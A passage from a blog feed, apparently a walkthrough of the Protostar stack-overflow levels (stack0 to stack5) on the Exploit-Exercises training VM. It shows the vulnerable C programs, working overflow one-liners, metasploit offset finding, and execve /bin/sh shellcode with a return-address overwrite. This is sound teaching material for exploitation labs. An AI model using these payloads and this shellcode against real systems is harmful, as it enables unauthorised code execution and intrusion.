+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# gcc test.c -o test
+</span><span class='line'>
+</span><span class='line'>root@kali32:/tmp# ./test 
+</span><span class='line'>allocated executable memory at: 0xb7734000
+</span><span class='line'>hello</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now when everything works, our next step is to execute shell.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Exploit-Exercises: Protostar (Stack Levels)]]></title>
+    <link href="http://73696e65.github.io/blog/2015/06/23/exploit-exercises-protostar-stack-levels/"/>
+    <updated>2015-06-23T09:46:35+02:00</updated>
+    <id>http://73696e65.github.io/blog/2015/06/23/exploit-exercises-protostar-stack-levels</id>
+    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/">Exploit-Exercises: Protostar (v2)</a></p>
+
+<h2>Protostar Stack0</h2>
+
+<figure class='code'><figcaption><span>stack0.c </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">modified</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">modified</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">modified</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have changed the &#39;modified&#39; variable</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Try again?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ ruby -e 'print "\xfa" * 64' | ./stack0 
+</span><span class='line'>Try again?
+</span><span class='line'>user@protostar:/opt/protostar/bin$ ruby -e 'print "\xfa" * 64 + "\x01"' | ./stack0 
+</span><span class='line'>you have changed the 'modified' variable</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Protostar Stack1</h2>
+
+<figure class='code'><figcaption><span>stack1.c </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">modified</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;please specify an argument</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">modified</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">modified</span> <span class="o">==</span> <span class="mh">0x61626364</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have correctly got the variable to the right value</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Try again, you got 0x%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">modified</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ ./stack1 $(ruby -e 'print "X" * 64')
+</span><span class='line'>Try again, you got 0x00000000
+</span><span class='line'>
+</span><span class='line'>user@protostar:/opt/protostar/bin$ ./stack1 $(ruby -e 'print "X" * 64 + [0x41414141].pack("V") ')
+</span><span class='line'>Try again, you got 0x41414141
+</span><span class='line'>
+</span><span class='line'>user@protostar:/opt/protostar/bin$ ./stack1 $(ruby -e 'print "X" * 64 + [0x61626364].pack("V") ')
+</span><span class='line'>you have correctly got the variable to the right value</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Protostar Stack2</h2>
+
+<figure class='code'><figcaption><span>stack2.c </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">modified</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">variable</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">variable</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;GREENIE&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">variable</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;please set the GREENIE environment variable</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">modified</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">variable</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">modified</span> <span class="o">==</span> <span class="mh">0x0d0a0d0a</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have correctly modified the variable</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Try again, you got 0x%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">modified</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ ./stack2 
+</span><span class='line'>stack2: please set the GREENIE environment variable
+</span><span class='line'>
+</span><span class='line'>user@protostar:/opt/protostar/bin$ GREENIE=$(ruby -e 'print "A" * 64 + [0x41414141].pack("V")') ./stack2 
+</span><span class='line'>Try again, you got 0x41414141
+</span><span class='line'>
+</span><span class='line'>user@protostar:/opt/protostar/bin$ GREENIE=$(ruby -e 'print "A" * 64 + [0x0d0a0d0a].pack("V")') ./stack2 
+</span><span class='line'>you have correctly modified the variable</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Protostar Stack3</h2>
+
+<figure class='code'><figcaption><span>stack3.c </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="nf">win</span><span class="p">()</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;code flow successfully changed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="k">volatile</span> <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">fp</span><span class="p">)();</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">fp</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;calling function pointer, jumping to 0x%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
+</span><span class='line'>      <span class="n">fp</span><span class="p">();</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We need to rewrite fp function address with the address of win().</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ ruby -e 'print "X" * 64 + [0x41414141].pack("V")' | ./stack3 
+</span><span class='line'>calling function pointer, jumping to 0x41414141
+</span><span class='line'>Segmentation fault
+</span><span class='line'>
+</span><span class='line'>user@protostar:/opt/protostar/bin$ nm ./stack3 | grep win
+</span><span class='line'>08048424 T win
+</span><span class='line'>
+</span><span class='line'>user@protostar:/opt/protostar/bin$ ruby -e 'print "X" * 64 + [0x08048424].pack("V")' | ./stack3 
+</span><span class='line'>calling function pointer, jumping to 0x08048424
+</span><span class='line'>code flow successfully changed</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Protostar Stack4</h2>
+
+<figure class='code'><figcaption><span>stack4.c </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="nf">win</span><span class="p">()</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;code flow successfully changed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We use metasploit patterns (on Kali Linux) to determine the exact location of stored EIP:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># Window 1:
+</span><span class='line'>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_create.rb 80
+</span><span class='line'>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
+</span><span class='line'>
+</span><span class='line'># Window 2:
+</span><span class='line'>user@protostar:/opt/protostar/bin$ gdb -q ./stack4 
+</span><span class='line'>Reading symbols from /opt/protostar/bin/stack4...done.
+</span><span class='line'>(gdb) r
+</span><span class='line'>Starting program: /opt/protostar/bin/stack4 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
+</span><span class='line'>
+</span><span class='line'>Program exited normally.
+</span><span class='line'>(gdb) q
+</span><span class='line'>user@protostar:/opt/protostar/bin$ gdb -q ./stack4 
+</span><span class='line'>Reading symbols from /opt/protostar/bin/stack4...done.
+</span><span class='line'>(gdb) r
+</span><span class='line'>Starting program: /opt/protostar/bin/stack4 
+</span><span class='line'>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
+</span><span class='line'>
+</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
+</span><span class='line'>0x63413563 in ?? ()
+</span><span class='line'>
+</span><span class='line'># Window 1:
+</span><span class='line'>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x63413563
+</span><span class='line'>[*] Exact match at offset 76
+</span><span class='line'>
+</span><span class='line'># Window 2:
+</span><span class='line'>user@protostar:/opt/protostar/bin$ nm stack4 | grep win
+</span><span class='line'>080483f4 T win
+</span><span class='line'>
+</span><span class='line'>user@protostar:/opt/protostar/bin$ ruby -e 'print "A" * 76 + [0x080483f4].pack("V")' | ./stack4 
+</span><span class='line'>code flow successfully changed</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Protostar Stack5</h2>
+
+<figure class='code'><figcaption><span>stack5.c </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The idea is the same as in Stack4, but we need to store shellcode on stack, for example.</p>
+
+<p>Stack is executable:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ readelf -a ./stack4 | grep GNU_STACK
+</span><span class='line'>  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ git clone https://github.com/hellman/fixenv
+</span><span class='line'>Cloning into fixenv...
+</span><span class='line'>remote: Counting objects: 20, done.
+</span><span class='line'>Unpacking objects: 100% (20/20), done.
+</span><span class='line'>remote: Total 20 (delta 0), reused 0 (delta 0), pack-reused 20
+</span><span class='line'>
+</span><span class='line'>user@protostar:~$ cd fixenv/
+</span><span class='line'>
+</span><span class='line'>user@protostar:~/fixenv$ ./r.sh gdb /opt/protostar/bin/stack5 
+</span><span class='line'>GNU gdb (GDB) 7.0.1-debian
+</span><span class='line'>Copyright (C) 2009 Free Software Foundation, Inc.
+</span><span class='line'>License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html>
+</span><span class='line'>This is free software: you are free to change and redistribute it.
+</span><span class='line'>There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+</span><span class='line'>and "show warranty" for details.
+</span><span class='line'>This GDB was configured as "i486-linux-gnu".
+</span><span class='line'>For bug reporting instructions, please see:
+</span><span class='line'>&lt;http://www.gnu.org/software/gdb/bugs/>...
+</span><span class='line'>Reading symbols from /home/user/fixenv/.launcher...done.
+</span><span class='line'>
+</span><span class='line'>(gdb) set disassembly-flavor intel 
+</span><span class='line'>(gdb) disassemble main 
+</span><span class='line'>Dump of assembler code for function main:
+</span><span class='line'>0x080483c4 &lt;main+0>:   push   ebp
+</span><span class='line'>0x080483c5 &lt;main+1>:   mov    ebp,esp
+</span><span class='line'>0x080483c7 &lt;main+3>:   and    esp,0xfffffff0
+</span><span class='line'>0x080483ca &lt;main+6>:   sub    esp,0x50
+</span><span class='line'>0x080483cd &lt;main+9>:   lea    eax,[esp+0x10]
+</span><span class='line'>0x080483d1 &lt;main+13>:  mov    DWORD PTR [esp],eax
+</span><span class='line'>0x080483d4 &lt;main+16>:  call   0x80482e8 &lt;gets@plt>
+</span><span class='line'>0x080483d9 &lt;main+21>:  leave  
+</span><span class='line'>0x080483da &lt;main+22>:  ret    
+</span><span class='line'>End of assembler dump.
+</span><span class='line'>
+</span><span class='line'>(gdb) b *0x080483d4
+</span><span class='line'>Breakpoint 1 at 0x80483d4: file stack5/stack5.c, line 10.
+</span><span class='line'>
+</span><span class='line'>(gdb) b *0x080483d9
+</span><span class='line'>Breakpoint 2 at 0x80483d9: file stack5/stack5.c, line 11.
+</span><span class='line'>
+</span><span class='line'>(gdb) r
+</span><span class='line'>Starting program: /home/user/fixenv/.launcher 
+</span><span class='line'>
+</span><span class='line'>Breakpoint 1, 0x080483d4 in main (argc=1, argv=0xbffff914) at stack5/stack5.c:10
+</span><span class='line'>10    stack5/stack5.c: No such file or directory.
+</span><span class='line'>  in stack5/stack5.c
+</span><span class='line'>
+</span><span class='line'>(gdb) x /xw $esp
+</span><span class='line'>0xbffff810:   0xbffff820
+</span><span class='line'>
+</span><span class='line'>(gdb) c
+</span><span class='line'>Continuing.
+</span><span class='line'>ABCDEFGH
+</span><span class='line'>
+</span><span class='line'>Breakpoint 2, main (argc=1, argv=0xbffff914) at stack5/stack5.c:11
+</span><span class='line'>11    in stack5/stack5.c
+</span><span class='line'>(gdb) x /s 0xbffff820
+</span><span class='line'>0xbffff820:    "ABCDEFGH"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The address 0xbffff820 represents the buffer[] address, we store our shellcode here:</p>
+
+<p>user@protostar:~/fixenv$ export EGG=$(ruby -e &lsquo;print &ldquo;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&rdquo;&rsquo;)
+user@protostar:~/fixenv$ ./r.sh getvar EGG
+0xbfffff70  \x70\xff\xff\xbf  (EGG)
+user@protostar:~/fixenv$ ruby -e &lsquo;print &ldquo;A&rdquo; * 76 + [0xbfffff70].pack(&ldquo;V&rdquo;)&rsquo; | ./stack5
